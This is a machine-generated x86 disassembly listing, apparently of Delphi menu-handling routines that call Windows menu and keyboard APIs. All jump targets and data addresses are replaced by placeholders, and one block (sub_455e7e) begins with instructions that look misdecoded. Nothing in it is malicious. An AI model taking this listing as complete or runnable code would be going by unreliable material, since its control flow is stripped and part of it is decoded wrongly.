jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c6e8
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4549e8
push eax
mov edx esi
mov eax ebx
call sub_4549e8
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404528
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407ff4
push ebp
mov eax [ ebp - 0x2c ]
call sub_455384
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_455384
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c6e8
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_4040a0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4549e8
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_4549e8
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_4574a4
mov edx [ ebp - 0x40 ]
pop eax
call sub_40405c
mov edx esi
mov eax ebx
call sub_4549e8
push eax
mov edx esi
mov eax ebx
call sub_4549e8
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4042c8
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404528
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_455438
mov eax [ ebp - 0x18 ]
call sub_4042c8
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404568
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4045b0
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_455438
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_455a94
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4549d8
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4549d8
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_455c18
test al al
je r-xdata
mov eax esi
call sub_4549d8
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4549e8
call sub_455a70
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_4549e8
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_4549e8
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4549e8
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4549e8
call sub_455a70
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_4549e8
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4549e8
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4549e8
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_4549e8
call sub_455a70
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_455bec
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_455bec
and eax 0x7f
mov al [ eax + rw-data ]
sub_455c18
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_455c18
and eax 0x7f
mov al [ eax + rw-data ]
sub_455c44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45292c
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_420714
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_456970
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_455ce0
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403234
mov eax [ esi + 0x44 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_455d54
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_455d54
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_452498
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_454ddc
mov eax ebx
pop esi
pop ebx
retn
sub_455d94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_4549d8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_4549e8
call sub_455d94
pop ecx
test al al
je r-xdata
sub_455e2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_455d94
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_452498
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_455e5c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_455e2c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_457228
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_455e7e
sbb al 0x45
add al ch
cmp dl ch
cli
inc [ eax + eax * 8 - 0x3974e98c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
mov ecx ebx
mov edx ebp
mov eax esi
call sub_455e2c
jmp r-xdata
mov eax esi
call sub_457228
mov edi eax
jmp r-xdata
test eax eax
je r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_455ecc
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_455e2c
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_455ee8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_455e2c
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_455598
mov ebx eax
xor edx edx
mov eax edi
call sub_455a94
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_454f00
mov eax [ esi + 0x34 ]
call sub_454f00
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_452e3c
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_4493d8
push eax
call DrawMenuBar
sub_455fd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_455fd4
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_4560f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_455e2c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_454f00
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_455fc4
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_456128
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42b22c
xor eax eax
push ebp
push sub_456226
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42b22c
xor eax eax
push ebp
push sub_4561fb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_455fd4
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42b224
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45622d
mov eax [ rw-data ]
call sub_42b224
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_455e2c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_45624c
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_4565d0
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_4565d0
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_456308
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_4568a4
mov eax ebx
call sub_4089ac
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_4563a8
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_456308
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404278
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4044c8
lea edx [ ebp - 0x200 ]
call sub_408a70
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45643c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_4564ac
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45694c
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45694c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_45694c
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_4564b8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_4563a8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_45643c
mov eax ebx
call sub_456970
jmp r-xdata
sub_456520
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_456568
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_450798
mov eax ebx
call sub_455d7c
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_4507dc
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_4207e4
sub_4565a4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420a30
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_456568
sub_4565e8
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_455e2c
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_455e2c
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_45997c
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_456644
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_456719
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_455e2c
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_455e2c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_4549d8
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4549e8
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_4041f0
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_4041f0
mov eax [ ebp - 0xc ]
pop edx
call sub_4081d4
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_457538
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456720
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40402c
retn
sub_45672c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4565e8
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_456644
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_4568a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_455fb0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_455e2c
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_455e2c
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
